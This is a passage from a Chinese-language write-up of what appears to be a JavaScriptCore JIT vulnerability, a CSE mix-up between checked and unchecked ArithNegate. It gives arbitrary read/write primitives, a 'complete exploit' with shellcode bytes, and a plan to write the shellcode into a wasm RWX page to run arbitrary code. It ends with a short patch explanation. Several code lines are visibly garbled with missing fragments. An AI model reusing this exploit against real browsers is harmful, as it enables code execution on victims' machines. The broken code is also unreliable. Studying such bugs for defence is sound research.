所以通过读写victim.prop就可以实现任意地址的读写，代码如下：
    function Read64(addr) {
        driver[1] = i2f(addr+0x10);
        return NewAddrOf(victim.prop);
    }
    function Write64(addr, val) {
        driver[1] = i2f(addr+0x10);
        victim.prop = i2f(val);
    }
### 任意代码执行
和v8的利用相似，通过任意读查找wasm_function中rwx区域，通过任意写将shellcode写入该区域即可执行任意代码。
完成exp代码如下（适配debug版本）：
    const MAX_ITERATIONS = 0xc0000;
    const buf = new ArrayBuffer(8);
    const f64 = new Float64Array(buf);
    const u32 = new Uint32Array(buf);
    function f2i(val)
    { 
        f64[0] = val;
        return u32[1] * 0x100000000 + u32[0];
    }
    function i2f(val)
    {
        let tmp = [];
        tmp[0] = parseInt(val % 0x100000000);
        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
        u32.set(tmp);
        return f64[0];
    }
    function i2obj(val)
    {
        return i2f(val-0x02000000000000);
    }
    function hex(i)
    {
        return "0x"+i.toString(16).padStart(16, "0");
    }
    var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
        96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
        105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
        72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
        72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
        184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
        94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
    function MakeJitCompiledFunction() {
        function target(num) {
            for (var i = 2; i 0) {
                    return arr[idx] = 1.04380972981885e-310;  // i2f(0x133700001337);
                }
            }
        }
    }
    let noCoW = 13.37;
    let arr = [noCoW, 2.2, 3.3];
    let oobArr = [noCoW, 2.2, 3.3];
    let objArr = [{}, {}, {}];
    for(let i=0; iarithMode()));
添加arithMode，使CSE重新检查ArithNegate操作，判断是unchecked 还是checked
模式，并进入不同的处理，而不能直接互相替换。
## 参考链接